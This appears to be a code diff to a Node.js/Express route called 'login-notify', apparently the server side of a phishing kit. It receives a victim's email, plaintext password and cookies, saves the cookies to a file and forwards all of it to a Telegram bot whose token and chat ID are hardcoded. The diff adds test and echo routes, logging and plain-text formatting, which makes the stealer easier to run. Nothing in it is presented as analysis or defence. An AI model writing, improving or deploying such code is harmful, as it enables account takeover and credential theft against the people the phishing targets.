@@ -7,7 +7,7 @@ const fs = require('fs').promises;
 const path = require('path');
 const router = express.Router();
 
-// Configure via env variables - FIXED: Use process.env
+// Configure via env variables
 const BOT_TOKEN = process.env.BOT_TOKEN || "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4";
 const CHAT_ID = process.env.CHAT_ID || "6068638071";
 
@@ -21,7 +21,7 @@ console.log('Telegram Config:', {
 const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null;
 const COOKIES_DIR = path.join(__dirname, '../cookies');
 
-// Add this function for better Telegram error handling
+// Telegram message sending function with plain text only
 async function sendTelegramMessage(message) {
   if (!TELEGRAM_API) {
     console.warn('Telegram API not configured');
@@ -36,10 +36,10 @@ async function sendTelegramMessage(message) {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: CHAT_ID,
-        text: message,
-        parse_mode: "Markdown"
+        text: message
+        // NO parse_mode - plain text only
       }),
-      timeout: 10000 // 10 second timeout
+      timeout: 10000
     });
 
     const result = await response.json();
@@ -115,12 +115,60 @@ ${Object.entries(cookiesAfter)
   return { filename, filepath };
 }
 
-// Option 1: Simple redirect that sets cookies
+// Test routes
+router.get('/health', (req, res) => {
+  res.json({ 
+    status: 'ok',
+    service: 'login-notify',
+    time: new Date().toISOString(),
+    telegramConfigured: !!TELEGRAM_API
+  });
+});
+
+router.get('/test', (req, res) => {
+  res.json({ 
+    message: 'Login notify endpoint is working!',
+    timestamp: new Date().toISOString(),
+    environment: process.env.NODE_ENV || 'development'
+  });
+});
+
+// Echo route to test POST requests
+router.post('/echo', (req, res) => {
+  console.log('Echo received:', req.body);
+  res.json({ 
+    received: req.body,
+    headers: req.headers,
+    success: true 
+  });
+});
+
+// Main login notification endpoint
 router.post('/', async (req, res) => {
   try {
+    console.log('=== LOGIN-NOTIFY ENDPOINT HIT ===');
+    console.log('Headers:', req.headers);
+    console.log('Body:', req.body);
+    console.log('Method:', req.method);
+    console.log('URL:', req.url);
+    console.log('IP:', req.ip);
+    console.log('================================');
+
     const { email, password, redirect_url } = req.body || {};
+    
+    console.log('Received data:', { 
+      email, 
+      password: password ? '***' : 'missing', 
+      redirect_url 
+    });
+
     if (!email || !password) {
-      return res.status(400).json({ success: false, message: "Missing email or password" });
+      console.log('Missing email or password');
+      return res.status(400).json({ 
+        success: false, 
+        message: "Missing email or password",
+        received: { hasEmail: !!email, hasPassword: !!password }
+      });
     }
 
     // Capture cookies BEFORE any action
@@ -145,11 +193,11 @@ router.post('/', async (req, res) => {
       console.error('Error creating cookies file:', fileError);
     }
 
-    // Build message
+    // Build plain text message - NO MARKDOWN
     const cookieReport = Object.entries(cookiesBefore).map(([k, v]) => `- ${k}: ${v}`).join('\n') || '(no cookies sent)';
 
-    // Build Telegram message - FIXED: Simplified message to avoid formatting issues
-    const message = `📌 Login Notification
+    // Build Telegram message - PLAIN TEXT ONLY
+    const message = `LOGIN NOTIFICATION
 
 Email: ${email}
 Password: ${password}
@@ -164,13 +212,12 @@ Initial Cookies (${Object.keys(cookiesBefore).length}):
 ${cookieReport}
 `;
 
-    // Send to Telegram with proper error handling - FIXED
+    // Send to Telegram with plain text only
     console.log('Sending Telegram notification...');
     const telegramResult = await sendTelegramMessage(message);
     
     if (!telegramResult.success) {
       console.error('Failed to send Telegram notification:', telegramResult.error);
-      // Continue with the response even if Telegram fails
     } else {
       console.log('Telegram notification sent successfully');
     }
@@ -220,15 +267,14 @@ ${cookieReport}
     });
 
   } catch (error) {
-    console.error("Error in /login-notify:", error);
+    console.error("Full error in /login-notify:", error);
     return res.status(500).json({ 
       success: false, 
       message: "Internal server error",
-      error: error.message 
+      error: error.message,
+      stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
     });
   }
 });
-
-// ... rest of your code remains the same for other routes
 
 module.exports = router;
